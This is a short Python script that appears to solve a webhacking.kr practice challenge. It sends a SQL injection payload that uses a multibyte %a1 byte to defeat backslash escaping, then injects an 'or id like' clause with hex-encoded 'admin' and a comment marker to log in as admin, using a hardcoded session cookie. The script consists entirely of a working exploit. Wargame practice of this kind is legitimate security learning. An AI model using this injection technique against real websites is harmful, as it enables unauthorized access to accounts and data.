import requests

url = "https://webhacking.kr/challenge/web-22/"
cookie = {'PHPSESSID':'huvq63u6ksq6f2jvcov3arq9q0'}


# %a1-%fe + \ 
url = url + "?id=%a1%27 or id like 0x61646D696E %23" + "&pw=1"
res = requests.get(url, cookies = cookie)
print(res.text)
